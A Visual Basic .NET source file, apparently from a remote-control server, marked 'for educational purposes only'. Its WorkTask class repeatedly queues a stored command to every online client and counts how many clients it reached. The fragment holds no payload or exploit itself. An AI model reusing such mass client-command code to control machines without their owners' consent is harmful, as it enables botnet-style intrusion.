
'       │ Author     : NYAN CAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.


Public Class WorkTask

    Public TaskID As String
    Private AllDone As New List(Of String)
    Public F As Form1
    Private isOK As Boolean = False
    Private Obj As Object()

    Sub New(ParamArray Args As Object())
        Obj = Args
    End Sub

    Delegate Sub _Work(ByVal args As Object())
    Public Async Sub Work(ByVal args As Object())
        While True
            Try
                If F.InvokeRequired Then
                    F.Invoke(New _Work(AddressOf Work), New Object() {args})
                    Exit Sub
                Else
                    Await Task.Delay(15000)
                    isOK = False
                    For Each L As ListViewItem In F.LV3.Items
                        If L.Tag = TaskID Then
                            isOK = True
                            For Each ClientOnServerList In Settings.Online
                                If Not AllDone.Contains(ClientOnServerList.ID) Then
                                    Dim ClientReq As New Outcoming_Requests(ClientOnServerList, Obj)
                                    Pending.Req_Out.Add(ClientReq)
                                    AllDone.Add(ClientOnServerList.ID)
                                    L.SubItems(F._EXE.Index).Text += 1
                                End If
                            Next
                            Exit For
                        End If
                    Next
                End If

                If isOK = False Then
                    Exit Sub
                End If
            Catch ex As Exception
                Messages.ClinetLog(Nothing, ex.Message, Color.Red)
                Exit Sub
            End Try
        End While
    End Sub
End Class
